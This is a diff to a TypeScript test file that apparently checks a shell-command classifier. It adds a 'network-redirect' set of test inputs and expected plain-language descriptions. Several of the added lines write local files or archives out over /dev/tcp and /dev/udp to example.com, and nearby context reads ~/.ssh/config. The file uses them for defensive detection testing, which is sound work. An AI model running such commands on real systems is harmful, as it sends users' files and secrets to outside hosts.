@@ -52,6 +52,12 @@ const SAMPLES: Record<ShellDoubt, string[]> = {
   'eval-or-source': [c('eval', 'ls'), c('source', './env.sh'), c('.', './env.sh'), c('builtin', 'eval', 'ls'), c('alias', 'ls=pwd'), c('trap', "'ls'", 'EXIT'), c('hash', '-p', '/tmp/x', 'cat')],
   'shell-syntax': ['( ls )', '{ ls; }', 'if true; then ls; fi', 'for f in a; do ls; done', '! ls', 'f() { ls; }', '[[ -f x ]]', 'while true; do ls; done', "echo 'unterminated"],
   'unsupported-redirect': ['ls >', 'ls > > f'],
+  'network-redirect': [
+    'tar cz ./notes > /dev/tcp/example.com/443', 'echo hi > /dev/tcp/example.com/80', 'cat < /dev/tcp/example.com/80',
+    'cat ./readme.txt | base64 > /dev/udp/example.com/53', 'exec 3<>/dev/tcp/example.com/443', 'tee /dev/tcp/example.com/80 < ./readme.txt',
+    'dd if=./readme.txt of=/dev/udp/example.com/53', 'cat > /dev/tcp/example.com/80', 'cat ./readme.txt > /dev/tcp/example.com',
+    'wc -l ./readme.txt > /dev/tcp/example.com/80', 'cat ./readme.txt > /dev/tcp/example.com/443 2> ./err.log',
+  ],
   'exec-wrapper': [
     c('bash', '-c', "'ls'"), c('sh', '-c', 'ls'), c('su', '-c', 'ls'), c('su', 'root', '-c', 'ls'), c('pkexec', 'ls'), c('env', '-S', "'ls -l'"),
     c('xargs', 'rm'), c('find', '.', '-exec', 'cat', '{}', '\\;'), c('find', '.', '-execdir', 'sh', '-c', 'x', '\\;'), c('find', '.', '-ok', 'ls', '\\;'),
@@ -124,6 +130,8 @@ describe('#648 r3 R1 — the understood subset is ONE list, and every entry is t
   it('commands inside the subset stay specific and confident', () => {
     for (const [command, text] of [
       ['cat ~/.ssh/config', 'Read a file in your SSH folder: "~/.ssh/config"'],
+      ['cat ./readme.txt > /dev/tcp/example.com/80', 'Send a file ("./readme.txt") to example.com'],
+      ['base64 ./readme.txt >> /dev/udp/example.org/514', 'Send a file ("./readme.txt") to example.org'],
       ['cat $HOME/.ssh/config', 'Read a file in your SSH folder: "$HOME/.ssh/config"'],
       ['ls -la 2>/dev/null', 'Run ls (other details not shown)'],
       ['echo done # $(not run)', 'Run echo (other details not shown)'],
